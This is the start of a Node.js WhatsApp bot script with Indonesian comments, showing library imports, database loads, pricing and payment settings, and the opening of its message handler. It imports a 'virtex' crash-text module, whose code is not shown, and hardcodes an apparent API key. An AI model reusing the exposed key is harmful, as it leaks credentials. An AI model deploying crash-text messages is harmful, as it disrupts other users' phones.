/*

	あ GK KASI CREDIT RenB0T, GK USAH RE UPLOAD
	あ SUSAH" NGE FIX, LU CUMA NUMPANG NAMA DOANG
	あ YANG BELUM PAHAM CAR RUN DI HEROKU TONTON AJA VIDEO SEBELUMNYA
	あ FITUR JUALAN TELAH DI HAPUS [ Bisa order klo mau ]
	
	あ JASA RUN HEROKU BISA PC wa.me/6285845823026 BIAR BOT NYA GAK TERLALU DELAY
	
*/   
const
	{
		WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		relayWAMessage,
		mentionedJid,
		processTime
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const crypto = require('crypto')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const hx = require('hxz-api')
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const simple = require('./lib/simple.js')
const _sewa = require("./lib/sewa");
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const util = require('util')
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const { yta2, ytv2, ytv3, ytv4} = require('./lib/y2mate')
const { tiktokDown } = require("./lib/tiktok")
const { webp2mp4File} = require('./lib/webp2mp4')
const { mediafireDl} = require('./lib/mediafire.js')
const { msgFilter } = require('./lib/antispam')
const { downloadig, igstory } = require("./lib/instadl.js");
const { virtex, vipi } = require('./lib/virtex.js')
const setTtt = require('./lib/tictactoe.js')
const off = require('./lib/afk.js')
let _off = JSON.parse(fs.readFileSync('./src/afk.json'))
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const ameClient = require("amethyste-api")
const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')
const { addVote, delVote } = require('./lib/vote')
const { jadibot, stopjadibot, listjadibot } = require('./lib/jadibot')
const premium = require("./lib/premiun");
const { isLimit, limitAdd, getLimit, giveLimit, addBalance, kurangBalance, getBalance, isGame, gameAdd, givegame, cekGLimit } = require("./lib/about_user")
const { list_aov } = require('./shop/aov')
const { list_cod } = require('./shop/cod')
const { list_sausage } = require('./shop/sausage')
const { list_lol } = require('./shop/lol')
const { list_valo } = require('./shop/valo')
const { list_price } = require('./shop/price')
const { allpayment } = require('./shop/allpayment')
const { pc_sewa } = require('./shop/sewa')
const { gcbotwa } = require('./shop/grupbot')
const { donasibot } = require('./shop/donasi')
const { infobot } = require('./shop/infobot')
const { jadibut } = require('./shop/jadibot')

const balance = JSON.parse(fs.readFileSync('./database/balance.json'));
const glimit = JSON.parse(fs.readFileSync('./database/glimit.json'))
const limit = JSON.parse(fs.readFileSync('./database/limit.json'))
const register = JSON.parse(fs.readFileSync('./database/user/register.json'))
const  _premium = JSON.parse(fs.readFileSync('./src/premiun.json'));
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antivirtex = JSON.parse(fs.readFileSync("./src/antivirtex.json"))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
const audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))
const imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
const videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const absen = JSON.parse(fs.readFileSync('./src/absen.json'))
const tictactoe = JSON.parse(fs.readFileSync("./src/tictactoe.json"))
const _win = JSON.parse(fs.readFileSync('./src/tttwin.json'))
const _lose = JSON.parse(fs.readFileSync('./src/tttlose.json'))
const voting = JSON.parse(fs.readFileSync('./lib/voting.json'))
const scommand = JSON.parse(fs.readFileSync('./lib/scommand.json'))
const banned = JSON.parse(fs.readFileSync('./src/banned.json'))
const _nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const _leveling = JSON.parse(fs.readFileSync('./src/leveling.json'))
const _level = JSON.parse(fs.readFileSync('./src/level.json'))
const tebakgambar = JSON.parse(fs.readFileSync('./src/tebakgambar.json'))
const caklontong = JSON.parse(fs.readFileSync('./src/caklontong.json'))
const family = JSON.parse(fs.readFileSync('./src/family100.json'))
const tebakanime = JSON.parse(fs.readFileSync('./src/tebakanime.json'))
const  sewa = JSON.parse(fs.readFileSync('./src/sewa.json'));
const event = JSON.parse(fs.readFileSync('./src/event.json'))


//var creatorList = ['Creator WhatsApp Bot', 'Whatsapp Bot Indonesia', 'Creator Bot' , ' Bot WhatsApp']
var creator = setting.ownername
const  { ind, eng, es, ml, ru, pt } = require(`./language`)
lang = ind //language
const Exif = require('./lib/exif')
const exif = new Exif()

//set_sticker_command//
cmd_stc_menu = '7446'
cmd_stc_ping = '7292'
cmd_stc_play_music = '8046'
cmd_stc_group_close = '7850'
cmd_stc_group_open = '7878'
cmd_stc_image_to_sticker = '7688'
cmd_stc_to_image = '6964'
cmd_stc_self = '7038'
cmd_stc_public = '7144'
//set_sticker_command//
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    /*
SEBAGIAN LU EDIT DI SETTING.JSON
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
var nomor_ovo = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var nomor_dana = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var nomor_gopay = `0887435047326\nA.N R*****DI` //gk usah di ubah ya klo gk punya ntr eror
var qr_code_ovo = 'https://h.top4top.io/p_2053vk0uw1.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_dana = 'https://j.top4top.io/p_20532posd1.jpg' //gk usah di ubah ya klo gk punya ntr eror
var qr_code_gopay = 'https://i.top4top.io/p_2053em3vh1.jpg' //gk usah di ubah ya klo gk punya ntr eror

var _minggu = 'Rp 15.000,00' //Masukkan harga sewa sesuai keinginan
var __minggu = 'Rp 20.000,00'
var ___minggu = 'Rp 25.000,00'
var _bulan = 'Rp 35.000,00'
var _permanen = 'Rp 100.000,00'
var __permanen = 'Rp 150.000,00'

zeksApikey = 'Alphabott' //ganti pake apikey lu biar limitnya gk cepet abis 
ApiZeks = 'https://api.zeks.me' // regis disini klo mau dapat apikeynya
thumbnail = setting.thumb
pp_bot = fs.readFileSync(`image/${thumbnail}`)
fthumb = setting.fakethumb
hit_today = []
blocked = []
ban = []
limitawal = "100"
gcounttprem = "999999" 
gcounttuser = "50" 

let multi = true
let nopref = false
let single = false
let prefa = setting.prefix
let menusimple = false
let Mloc = false
let autobio = setting.autobio
let antihidetag = setting.antihidetag

banChats = setting.self_mode
autorespon = true
offline = false
readGc = true 
readPc = true 
antitrol = true 
bugc = false
autovn = false
autoketik = false
autoregister = setting.user_register

img = setting.img
baper = 'Owner RenB0T'
apiku = 'https://youtube.com/channel/UChy1o7FRCEkt8ewAkFxq0HA'
gc_wa_lu = 'https://chat.whatsapp.com/Ia1iqqUnchtCqmpxb17kSm' //klo gk punya gc wa gk usah di ganti 👍
targetpc = setting.ownerNumberr
owner = targetpc
fake = setting.fake
numbernye = '6285845823026'
waktu = 'Nothing'
alasan = 'Nothing'
botname = setting.botname
ownername = setting.ownername
peknem = setting.ownername
ownerNumber = setting.ownerNumber
cr = setting.cr
petik = '```'
titik =`...`
enter ='\n'
msgId="B826873620DD5947E683E3ABE663F263"
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
const X = "❌" 
const O = "⭕️" 
const tunjuk = "👈" 
winawal = 1 
loseawal = 1 
memberwin = 1 
memberlose = 1 

//Credit For 404 SQUAD ( Gk usah di hapus mek)
//RenB0T
//Felix
//Lenz
//Arya
const uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const ikan = JSON.parse(fs.readFileSync('./database/user/ikan.json'))
const planet = JSON.parse(fs.readFileSync('./database/user/planet.json'))
const coal = JSON.parse(fs.readFileSync('./database/user/coal.json'))
const stone = JSON.parse(fs.readFileSync('./database/user/stone.json'))
const ore = JSON.parse(fs.readFileSync('./database/user/ore.json'))
const ingot = JSON.parse(fs.readFileSync('./database/user/ingot.json'))
const kayu = JSON.parse(fs.readFileSync('./database/user/kayu.json'))

//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
        if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
		m = simple.smsg(alpha, mek)
		let { mentioned } = m
		bail = m.isBaileys
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
